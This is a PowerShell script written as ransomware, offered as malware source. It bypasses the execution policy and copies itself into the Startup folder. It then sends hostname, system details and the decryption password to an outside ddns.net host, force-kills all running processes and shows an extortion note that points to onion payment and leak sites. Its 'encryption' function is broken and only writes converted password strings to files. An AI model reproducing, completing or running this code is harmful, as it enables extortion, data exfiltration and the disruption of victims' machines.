Set-ExecutionPolicy Bypass -Scope Process -Force

# Function to encrypt directories using AES encryption
function Encrypt-Directories {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Password
    )
    
    # Encrypt directories recursively in the current directory
    Get-ChildItem -Directory -Recurse | ForEach-Object {
        $encryptedDirectoryPath = "$($_.FullName).encrypted"
        # Encrypt the directory using AES encryption
        ConvertTo-SecureString -String $Password -AsPlainText -Force | ConvertFrom-SecureString | Out-File $encryptedDirectoryPath
    }
}

# Function to create a remote connection and send device information, decryption password, and random ID
function Send-DeviceInformation {
    param (
        [Parameter(Mandatory=$true)]
        [string]$DNSAddress,
        [Parameter(Mandatory=$true)]
        [string]$Password,
        [Parameter(Mandatory=$true)]
        [string]$RandomID
    )
    
    # Get device information
    $deviceInfo = @{
        "Hostname" = $env:COMPUTERNAME
        "OperatingSystem" = (Get-CimInstance Win32_OperatingSystem).Caption
        "Processor" = (Get-CimInstance Win32_Processor).Name
        "RAM" = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
    }
    $deviceInfoJson = $deviceInfo | ConvertTo-Json

    # Establish a remote connection to the specified DNS address
    # Send device information, decryption password, and random ID over DNS
    $url = "$DNSAddress?info=$deviceInfoJson&password=$Password&randomID=$RandomID"
    try {
        Invoke-WebRequest -Uri $url -UseBasicParsing | Out-Null
        Write-Host "Device information sent to $DNSAddress"
    }
    catch {
        Write-Host "Failed to send device information to $DNSAddress"
    }
}

# Function to stop running processes except for this script
function Stop-Processes {
    # Stop all running processes except for this script
    $scriptProcessName = $MyInvocation.MyCommand.Name
    Get-Process | Where-Object { $_.ProcessName -ne $scriptProcessName } | ForEach-Object {
        Stop-Process -Id $_.Id -Force
    }
}

# Function to visit a website in the background
function Visit-SiteInBackground {
    param (
        [Parameter(Mandatory=$true)]
        [string]$URL
    )
    
    # Visit the website in the background
    Start-Process -FilePath "cmd" -ArgumentList "/c start $URL" -WindowStyle Hidden
}

# Function to get network information
function Get-NetworkInfo {
    # Get network information
    Get-NetIPAddress | Select-Object -Property IPAddress, InterfaceAlias, InterfaceIndex
}

# Function to get public IP address
function Get-PublicIP {
    try {
        $publicIP = Invoke-RestMethod -Uri "http://api.ipify.org" -UseBasicParsing
        $publicIP
    } catch {
        Write-Host "Failed to retrieve public IP address."
    }
}

# Function to start a process in the background by name
function Start-ProcessInBackground {
    param (
        [Parameter(Mandatory=$true)]
        [string]$ProcessName
    )
    
    # Start the process in the background
    Start-Process -FilePath "cmd" -ArgumentList "/c start /b $ProcessName" -WindowStyle Hidden
}

# Function to display a message popup over a black screen
function Show-MessageOverBlackScreen {
    $wshell = New-Object -ComObject WScript.Shell
    $intButton = $wshell.Popup("Attention! Your files have been encrypted. We highly suggest not shutting down your computer in case the encryption process is not finished, as your files may get corrupted.`nIn order to decrypt your files, you must pay for the decryption key & application.`nYou may do so by visiting us at http://avosjon4pfh3y7ew3jdwz6ofw7lljcxlbk7hcxxmnxlh5kvf2akcqjad.onion. This is an onion address that you may access using Tor Browser which you may download at https://www.torproject.org/download/`nDetails such as pricing, how long before the price increases and such will be available to you once you enter your ID presented to you below in this note in our website.`nContact us soon, because those who don't have their data leaked in our press release blog and the price they'll have to pay will go up significantly.`nThe corporations whom don't pay or fail to respond in a swift manner can be found in our blog, accessible at http://avosqxh72b5ia23dl5fgwcpndkctuzqvh2iefk5imp3pi5gfhel5klad.onion`nYour ID: $randomID",0,"Attention!",0x1
}

# Make the program run in the background and change the process name to a random name
# Add the script to run on startup with administrator permissions
$randomID = "$env:COMPUTERNAME-$(Get-Random)"
$scriptPath = $MyInvocation.MyCommand.Path
$randomProcessName = "$randomID.exe"
$startupFolder = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
$randomProcessPath = [System.IO.Path]::Combine($startupFolder, $randomProcessName)
Copy-Item -Path $scriptPath -Destination $randomProcessPath -Force
$WshShell = New-Object -comObject WScript.Shell
$shortcut = $WshShell.CreateShortcut($randomProcessPath)
$shortcut.TargetPath = "powershell.exe"
$shortcut.Arguments = "-windowstyle hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
$shortcut.Save()

# Encrypt directories with a random password
$randomPassword = ConvertTo-SecureString -String (Get-Random) -AsPlainText -Force
Encrypt-Directories -Password $randomPassword

# Establish a remote connection to the specified DNS address
$dnsAddress = "examplednstest00238367.ddns.net"
Send-DeviceInformation -DNSAddress $dnsAddress -Password $randomPassword -RandomID $randomID

# Stop any running processes or running apps except for this powershell script
Stop-Processes

# Visit a website in the background
Visit-SiteInBackground -URL "http://example.com"

# Get network information
Get-NetworkInfo

# Get public IP address
Get-PublicIP

# Start a process in the background by name
Start-ProcessInBackground -ProcessName "notepad.exe"

# Show message popup over a black screen
Show-MessageOverBlackScreen
